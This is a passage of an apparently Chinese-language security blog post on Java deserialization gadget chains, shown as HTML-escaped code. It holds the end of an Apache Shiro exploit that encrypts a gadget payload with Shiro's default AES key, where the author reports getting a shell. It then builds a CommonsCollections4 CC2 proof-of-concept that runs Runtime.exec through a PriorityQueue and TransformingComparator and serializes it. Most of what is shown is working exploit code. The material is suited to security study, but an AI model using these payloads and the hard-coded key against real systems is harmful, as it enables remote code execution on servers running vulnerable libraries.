&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">CtClass&lt;/span> &lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">pool&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ysoserial&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">payloads&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">testCC6ShiroEvil&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">testCC6Shiro&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getPayload&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toBytecode&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">AesCipherService&lt;/span> &lt;span style="color:#111">aes&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">AesCipherService&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">util&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDecoder&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">decode&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;kPH+bIxk5D2deZiIxcaaaA==&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteSource&lt;/span> &lt;span style="color:#111">ciphertext&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">aes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">encrypt&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">payloads&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ciphertext&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>由于我在Linux上测试，就不弹计算器，直接弹shell&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220302030308598.png" alt="image-20220302030308598">&lt;/p>
&lt;p>效果拔群！！！！！！&lt;/p>
&lt;p>这一节我们将&lt;code>TemplatesImpl&lt;/code>和CC6结合在一起，同时解决了CC3高版本利用不了的问题&lt;/p>
&lt;h2 id="cc2---cc4">CC2 - cc4&lt;/h2>
&lt;p>CC反序列化利用链被提出时，cc依赖有以下两个版本，groupId和artifactId都不一样&lt;/p>
&lt;ul>
&lt;li>commons-collections:commons-collections&lt;/li>
&lt;li>org.apache.commons:commons-collection4&lt;/li>
&lt;/ul>
&lt;p>表现在我们构造exp的区别是将&lt;code>decorate&lt;/code>改为了&lt;code>LazyMap&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#75af00">decorate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Map&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#75af00">LazyMap&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span> &lt;span style="color:#00a8c8">super&lt;/span> &lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">?&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LazyMap&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;(&lt;/span>&lt;span style="color:#111">map&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">factory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>直接把gadget改一下名字即可；不过为了专门适配cc4，ysoserial也有专门的链子CC2和CC4&lt;/p>
&lt;p>cc包之所以能找出这么多链子，除了相当基础以外，更多的原因在于它包含了很多可以执行任意方法的Transformer，所以找链子的过程相当于找一条从&lt;code>Serializable#readObject&lt;/code>到&lt;code>Transformer#transform&lt;/code>方法的调用链&lt;/p>
&lt;p>我们分析一下CC2，它用到的关键类有&lt;code>java.util.PriorityQueue&lt;/code>和&lt;code>org.apache.commons.collections4.comparators.TransformingComparator&lt;/code>（可通过comprare调用transform）&lt;/p>
&lt;p>&lt;code>java.util.PriorityQueue&lt;/code>重写了&lt;code>readObject&lt;/code>方法&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">java&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in size, and any hidden stuff
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">defaultReadObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in (and discard) array length
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read in all elements.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">size&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Elements are guaranteed to be in &amp;#34;proper order&amp;#34;, but the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// spec has never explained what that might be.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">heapify&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>heapify-&amp;gt; siftDown-&amp;gt; siftDownUsingComparator-&amp;gt; comparator.compare-&amp;gt; TransformingComparator-&amp;gt; compare-&amp;gt; transform
&lt;/code>&lt;/pre>&lt;p>构造poc&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectInputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.io.ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.Comparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.util.PriorityQueue&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.Transformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ChainedTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.ConstantTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.functors.InvokerTransformer&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">org.apache.commons.collections4.comparators.TransformingComparator&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CC2&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">fakeTransformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">)};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getMethod&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;invoke&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Object&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">]}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvokerTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Class&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">},&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>&lt;span style="color:#d88200">&amp;#34;calc.exe&amp;#34;&lt;/span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">),&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">};&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span> &lt;span style="color:#111">transformerChain&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ChainedTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fakeTransformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Comparator&lt;/span> &lt;span style="color:#111">comparator&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformingComparator&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PriorityQueue&lt;/span> &lt;span style="color:#111">queue&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">PriorityQueue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">comparator&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">transformerChain&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;iTransformers&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">transformers&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span> &lt;span style="color:#111">barr&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ByteArrayOutputStream&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectOutputStream&lt;/span> &lt;span style="color:#111">oos&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ObjectOutputStream&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">writeObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">queue&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">oos&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">close&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">barr&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
